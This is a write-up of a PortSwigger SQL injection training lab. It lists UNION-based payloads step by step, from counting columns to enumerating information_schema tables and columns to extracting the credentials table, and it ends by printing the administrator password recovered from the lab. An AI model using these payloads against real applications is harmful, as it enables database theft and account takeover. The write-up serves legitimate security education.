[Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  


## Steps to Solve

1. **Launch the Lab:** Open the PortSwigger lab and navigate to the shop interface.

2. **Intercept the Request:** Click on the **Accessories** category and intercept the category filter request using Burp Suite.

3. **Determine the Number of Columns:** Use `ORDER BY` to identify the number of columns.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

- `ORDER BY 1` – Success
- `ORDER BY 2` – Success
- `ORDER BY 3` – Error

**Result:** The query returns two columns.

4. **Identify Text-Compatible Columns:** Test both columns using:

```sql
' UNION SELECT 'abc', 'def'--
```

**Result:** Both columns accept text data.

5. **Find Database Table Names:** Query `information_schema.tables`:

```sql
' UNION SELECT table_name, NULL
FROM information_schema.tables--
```

**Result:** Identified the credentials table: `users_ovovsq`.

6. **Find Column Names:** Query `information_schema.columns`:

```sql
' UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name = 'users_ovovsq'--
```

**Result:** Found two columns:
- `username_veweyo`
- `password_gfwdhx`

7. **Retrieve User Credentials:** Extract usernames and passwords:

```sql
' UNION SELECT username_veweyo, password_gfwdhx
FROM users_ovovsq--
```

**Result:** Retrieved the administrator credentials.

- **Username:** `administrator`
- **Password:** `kwyer5rulpe3bw6oigdz`

8. **Login and Complete the Lab:** Open the login page and use the administrator credentials. Successful login completes the lab.

## Key Takeaways

- **UNION SELECT:** Retrieves data from additional database queries.
- **information_schema.tables:** Lists database tables.
- **information_schema.columns:** Lists table column names.
- **Credential Extraction:** Retrieves usernames and passwords from database tables.

## Lab Information

- **Vulnerability:** SQL Injection (SQLi)
- **Attack Type:** UNION-Based SQL Injection
- **Database:** MySQL
- **Tool:** Burp Suite Community Edition
